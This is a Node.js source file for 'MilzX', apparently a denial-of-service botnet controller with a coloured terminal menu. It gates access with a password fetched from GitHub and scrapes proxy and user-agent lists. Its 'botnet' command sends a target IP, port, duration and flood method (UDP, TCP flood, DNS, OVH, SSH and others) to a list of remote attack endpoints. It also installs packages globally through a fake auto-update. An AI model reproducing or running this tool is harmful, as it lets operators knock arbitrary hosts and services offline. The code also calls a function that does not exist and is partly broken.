#!/usr/bin/env node

const { exec, spawn  } = require('child_process')
const readline = require('readline')
const url = require('url')
const fs = require('fs')
const axios = require('axios')
const path = require('path')
const version = '5.1.9'
let processList = [];
const Reset = '\x1b[0m';
const biru = '\x1b[36m'
const bl = '\x1b[38;5;45m'
const ug = '\x1b[38;5;213m'
const tg = '\x1b[38;5;33m'
const ut = '\x1b[35m'


const permen = readline.createInterface({
  input: process.stdin,
  output: process.stdout
})
// [========================================] //
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
// [========================================] //
async function banner() {
    console.clear();
    const currentDate = new Date();
    const formattedDate = currentDate.toLocaleDateString('id-ID', {
        month: 'short',
        day: '2-digit',
        year: 'numeric',
    });
    const bannerText = `

\x1b[35m[ \x1b[37mSystem \x1b[35m]: \x1b[35mWelcome to \x1b[31mMilzX \x1b[37mCNTRL \x1b[37mMilzX\x1b[0m \x1b[35menjoy stay here\x1b[0m 
            \x1b[1m\x1b[41m __  ____ __    _  ______             _  \x1b[0m      
            \x1b[1m\x1b[46m/  |/  (_) /__ | |/_/ __/__ _____  __(_)______ \x1b[0m
           \x1b[1m\x1b[44m/ /|_/ / / /_ /_>  <_\ \/ -_) __/ |/ / / __/ -_)\x1b[0m
          \x1b[1m\x1b[45m/_/  /_/_/_//__/_/|_/___/\__/_/  |___/_/\__/\__/\x1b[0m 
              T.ME/MILZXDOS / T.ME/MILZXSERVICE
                                  
   \x1b[31mMilz\x1b[0m | Max Time [ \x1b[31m2000\x1b[0m ] | Status [ \x1b[31mOwner\x1b[0m ] | VIP [ \x1b[31mTrue\x1b[0m ]
                    \x1b[31m30384948.99 \x1b[0m Millennium (s)

======================================================================
Please type "\x1b[31mmenu\x1b[0m" or "\x1b[31mcls\x1b[0m" and "\x1b[31mmethods\x1b[0m"`;
    console.log(bannerText);
}
// [========================================] //
async function scrapeProxy() {
  try {
    const response = await fetch('https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt');
    const data = await response.text();
    fs.writeFileSync('proxy.txt', data, 'utf-8');
  } catch (error) {
    console.error(`Error fetching data: ${error.message}`);
  }
}
// [========================================] //
async function scrapeUserAgent() {
  try {
    const response = await fetch('https://gist.githubusercontent.com/pzb/b4b6f57144aea7827ae4/raw/cf847b76a142955b1410c8bcef3aabe221a63db1/user-agents.txt');
    const data = await response.text();
    fs.writeFileSync('ua.txt', data, 'utf-8');
  } catch (error) {
    console.error(`Error fetching data: ${error.message}`);
  }
}
// [========================================] //
function clearProxy() {
  if (fs.existsSync('proxy.txt')) {
    fs.unlinkSync('proxy.txt');
  }
}
// [========================================] //
function clearUserAgent() {
  if (fs.existsSync('ua.txt')) {
    fs.unlinkSync('ua.txt');
  }
}
// [========================================] //
async function bootup() {
  try {
    console.log(`|| ▓░░░░░░░░░ || 10%`);
    await exec(`npm i axios tls http2 hpack net cluster crypto ssh2 dgram @whiskeysockets/baileys libphonenumber-js chalk gradient-string pino mineflayer proxy-agent`)
    console.log(`|| ▓▓░░░░░░░░ || 20%`);
    const getLatestVersion = await fetch('https://raw.githubusercontent.com/Supranicol/siunn/main/sukibatjjuurr/verr.txt');
    const latestVersion = await getLatestVersion.text()
    console.log(`|| ▓▓▓░░░░░░░ || 30%`);
    if (version === latestVersion.trim()) {
    console.log(`|| ▓▓▓▓▓▓░░░░ || 60%`);
    
const secretBangetJir = await fetch('https://raw.githubusercontent.com/WhiteXbec/R3X/refs/heads/main/xxx.txt');
const password = await secretBangetJir.text();
    await console.log(`MASUKIN PASS NYA TUAN`)
    permen.question(`\x1b[1m\x1b[41mDIGITE A SENHA\x1b[0m: `, async (skibidi) => {
      if (skibidi === password.trim()) {
        console.log(`Successfuly Login`)
        await scrapeProxy()
        console.log(`|| ▓▓▓▓▓▓▓░░░ || 70%`)
        await scrapeUserAgent()
        console.log(`|| ▓▓▓▓▓▓▓▓▓▓ || 100%`)
        await sleep(700)
        console.clear()
        console.log(`Login berhasil! Welcome, 🪐! ${version}`)
        await sleep(1000)
		    await banner()
        console.log(` `)
        sigma()
      } else {
        console.log(`Wrong Key`)
        process.exit(-1);
      }
    }) 
  } else {
      console.log(`This Version Is Outdated. ${version} => ${latestVersion.trim()}`)
      console.log(`Waiting Auto Update...`)
      await exec(`npm uninstall -g permend-tools`)
      console.log(`Installing update`)
      await exec(`npm i -g permenmd-tools`)
      console.log(`Restart Tools Please`)
      process.exit()
    }
  } catch (error) {
    console.log(`Are You Online?`)
  }
}
// [========================================] //
async function AttackBotnet(args) {
    if (args.length < 3) {
        console.log(`Example: botnet <target> <port> <duration> <methods>
botnet 111.22.333.4 53 120 udp`);
        sigma();
        return;
    }
    const [target, port, duration, methods] = args;
    const validMethods = ["dns", "ovh", "udp", "tcp", "tcpflood", "tcpkiller", "killping", "ssh"];
    if (!validMethods.includes(methods.toLowerCase())) {
        console.error(`Method Is Not Organized. Type [ ${bold}${ungu}'srvmenu'${Reset} ] For Check Available Methods`);
        sigma();
        return;
        }

    let result;

    async function printWithDelay(text, delay = 26) {
        const lines = text.split("\n");
        for (let line of lines) {
            console.log(line);
            await new Promise(resolve => setTimeout(resolve, delay));
        }
    }

    try {
        const startTime = Date.now();
        const endTime = startTime + duration * 1000;
        const currentDate = new Date();
        const formattedDate = currentDate.toLocaleDateString('id-ID', {
            month: 'short',
            day: '2-digit',
            year: 'numeric',
        });
        
        processList.push({ target, methods, startTime, duration, endTime });
        console.clear();
        const attackLog = `

\x1b[1m\x1b[38;5;75mالهجوم بواسطة ميلز\x1b[0m


Please \x1b[31m"\x1b[0mcls\x1b[31m"\x1b[0m To return to home

       ${ug}╔═╗╔╦╗╔╦╗╔═╗${Reset}${ut}╔═╗╦╔═  ╔═╗╔═╗${Reset}${bl}╔╗╔╔╦╗${Reset}
       ${ug}╠═╣ ║  ║ ╠═╣${Reset}${ut}║  ╠╩╗  ╚═╗║╣${Reset} ${bl}║║║ ║ ${Reset}
       ${ug}╩ ╩ ╩  ╩ ╩ ╩${Reset}${ut}╚═╝╩ ╩  ╚═╝╚═╝${Reset}${bl}╝╚╝ ╩ ${Reset}
${ug}╔═══════════${Reset}${bl}════════════${Reset}${tg}══════════════════════════╗${Reset}
     \x1b[31m!\x1b[0m Attack Succesfully Sent \x1b[31m!\x1b[0m

    ${tg}H${Reset}${bl}os${Reset}${ug}t${Reset}     : \x1b[35m[\x1b[0m\x1b[1m\x1b[34m${target}\x1b[0m\x1b[35m]\x1b[0m
    ${tg}P${Reset}${bl}or${Reset}${ug}t${Reset}     : \x1b[35m[\x1b[0m\x1b[1m\x1b[34m${port}\x1b[0m\x1b[35m]\x1b[0m
    ${tg}T${Reset}${bl}im${Reset}${ug}e${Reset}     : \x1b[35m[\x1b[0m\x1b[1m\x1b[34m${duration}\x1b[0m\x1b[35m]\x1b[0m
    ${tg}Meth${Reset}${bl}od${Reset}${ug}s${Reset}  : \x1b[35m[\x1b[0m\x1b[1m\x1b[34m${methods}\x1b[0m\x1b[35m]\x1b[0m
    ${tg}Send${Reset} ${bl}B${Reset}${ug}y${Reset}  : \x1b[35m[\x1b[0m\x1b[1m\x1b[34mMilzX\x1b[0m\x1b[35m]\x1b[0m
    ${tg}Send${Reset} ${bl}O${Reset}${ug}n${Reset}  : \x1b[35m[\x1b[0m\x1b[1m\x1b[34m${formattedDate}\x1b[0m\x1b[35m]\x1b[0m
${ug}╚══════════${Reset}${bl}═════════════${Reset}${tg}══════════════════════════╝${Reset}
`;
//Tiru aja bang gpp gw doain cepet ketemu ajal awokawokawok
        await printWithDelay(attackLog, 26);

    } catch (error) {
        console.error('Error retrieving target information:', error.message);
    }

    let botnetData;
    let successCount = 0;
    const timeout = 20000;
    const validEndpoints = [];
    try {
        botnetData = JSON.parse(fs.readFileSync('./lib/botnet.json', 'utf8'));
    } catch (error) {
        console.error('Error loading botnet data:', error.message);
        botnetData = { endpoints: [] };
    }

    const requests = botnetData.endpoints.map(async (endpoint) => {
        const apiUrl = `${endpoint}?target=http://${target}&port=${port}&time=${duration}&methods=${methods}`;

        try {
            const response = await axios.get(apiUrl, { timeout });
            if (response.status === 200) {
                successCount++;
                validEndpoints.push(endpoint);
            }
        } catch (error) {
            console.error(`Error sending request to ${endpoint}: ${error.message}`);
        }
    });

    await Promise.all(requests);

    botnetData.endpoints = validEndpoints;
    try {
        fs.writeFileSync('./lib/botnet.json', JSON.stringify(botnetData, null, 2));
    } catch (error) {
        console.error('Error saving botnet data:', error.message);
    }
    sigma();
}
// [========================================] //
async function ongoingAttacks() {
    processList = processList.filter((process) => {
        const remaining = Math.max(0, Math.floor((process.endTime - Date.now()) / 1000));
        return remaining > 0;
    });

    if (processList.length === 0) {
        console.log("{Jack} no running attacks right now! Why not start some?");
        sigma();
        return;
    }

    // == 
    let attackDetails = "\x1b[44m\n=== Ongoing Attacks ===\n\x1b[0m";
    attackDetails += `\x1b[1m\x1b[35m┌─────┬──────────────────────┬───────┬──────────┬─────────┐\x1b[0m\n`;
    attackDetails += `\x1b[1m\x1b[35m│\x1b[0m  \x1b[1m\x1b[36m#\x1b[0m  \x1b[1m\x1b[35m│\x1b[0m        \x1b[1m\x1b[36mHOST\x1b[0m          \x1b[1m\x1b[35m│\x1b[0m \x1b[1m\x1b[36mSINCE\x1b[0m \x1b[1m\x1b[35m│\x1b[0m \x1b[1m\x1b[36mDURATION\x1b[0m \x1b[1m\x1b[35m│\x1b[0m \x1b[1m\x1b[36mMETHOD\x1b[0m  \x1b[1m\x1b[35m│\x1b[0m\n`;
    attackDetails += `\x1b[1m\x1b[35m├─────┼──────────────────────┼───────┼──────────┼─────────┤\x1b[0m\n`;

    processList.forEach((process, index) => {
        const host = process.ip || process.target;
        const since = Math.floor((Date.now() - process.startTime) / 1000);
        const duration = `\x1b[1m\x1b[36m${process.duration} sec\x1b[0m`;

        // Baris data
        attackDetails += `\x1b[1m\x1b[35m│\x1b[0m \x1b[1m\x1b[36m${String(index + 1).padEnd(3)}\x1b[0m \x1b[1m\x1b[35m│\x1b[0m \x1b[1m\x1b[36m${host.padEnd(20)}\x1b[0m \x1b[1m\x1b[35m│\x1b[0m \x1b[1m\x1b[36m${String(since).padEnd(5)}\x1b[0m \x1b[1m\x1b[35m│\x1b[0m \x1b[1m\x1b[36m${duration.padEnd(8)}\x1b[0m \x1b[1m\x1b[35m│\x1b[0m \x1b[1m\x1b[36m${process.methods.padEnd(7)}\x1b[0m \x1b[1m\x1b[35m│\x1b[0m\n`;
    });


    attackDetails += `\x1b[1m\x1b[35m└─────┴──────────────────────┴───────┴──────────┴─────────┘\x1b[0m\n`;

    console.log(attackDetails);
    sigma();
}

async function pushOngoing(target, methods, duration) {
  const startTime = Date.now();
  processList.push({ target, methods, startTime, duration })
  setTimeout(() => {
    const index = processList.findIndex((p) => p.methods === methods);
    if (index !== -1) {
      processList.splice(index, 1);
    }
  }, duration * 1000);
}
// [========================================] //
function MonitorongoingAttack() {
  console.log("\nongoing Attack:\n");
  processList.forEach((process) => {
console.log(`Target: ${process.target}
Methods: ${process.methods}
Duration: ${process.duration} Seconds
Since: ${Math.floor((Date.now() - process.startTime) / 1000)} seconds ago\n`);
  });
}
// [========================================] //
async function sigma() {
const getNews = await fetch(`https://raw.githubusercontent.com/dalyudiyudi12345/kamunanya/main/news.txt`)
const latestNews = await getNews.text();
const creatormyinfo = `
concurrents=50
timelimit=86400
cooldown=0
expiry=30835.14 Millenium(s) left
Myclient=SSH-2.0-OpenSSH_9.9`
permen.question(
`╭─[\x1b[1m\x1b[41mMilzX | Layer4\x1b[0m]: \n╰┈┈┈┈➤`, (input) => {
  const [command, ...args] = input.trim().split(/\s+/);

  if (command === 'menu') {
    console.log(`
▬▭▬▭▬▭▬▭▬▭▬▭▬
COMMAND MENU
- \x1b[1m\x1b[35mmethodsm\x1b[0m
- \x1b[1m\x1b[35mcls\x1b[0m
- \x1b[1m\x1b[35mbotnet\x1b[0m
▬▭▬▭▬▭▬▭▬▭▬▭▬
`);
    sigma();
  } else if (command === 'methods') {
    console.log(`
METHODS DDOS LAYER 4
▬▭▬▭▬▭▬▭▬▭▬▭▬
- \x1b[1m\x1b[35mKILLPING\x1b[0m
- \x1b[1m\x1b[35mTCPFLOOD\x1b[0m
- \x1b[1m\x1b[35mTCPKILLER\x1b[0m
- \x1b[1m\x1b[35mDNS\x1b[0m
- \x1b[1m\x1b[35mOVH\x1b[0m
- \x1b[1m\x1b[35mUDP\x1b[0m
- \x1b[1m\x1b[35mTCP\x1b[0m
- \x1b[1m\x1b[35mSSH\x1b[0m
▬▭▬▭▬▭▬▭▬▭▬▭▬
`);
    sigma();
  } else if (command === 'news') {
    console.log(`
${latestNews}`);
    sigma();
  } else if (command === 'myinfo') {
    console.log(`
${creatormyinfo}`);
    sigma();
  } else if (command === 'botnet') {
    AttackBotnet(args)
  } else if (command === 'ongoing') {
    ongoingAttack()
  } else if (command === 'cls') {
    banner()
    sigma()
    } else {
    console.log(`${command} Not Found`);
    sigma();
  }
});
}
// [========================================] //
function clearall() {
  clearProxy()
  clearUserAgent()
}
// [========================================] //
process.on('exit', clearall);
process.on('SIGINT', () => {
  clearall()
  process.exit();
});
process.on('SIGTERM', () => {
clearall()
 process.exit();
});

bootup()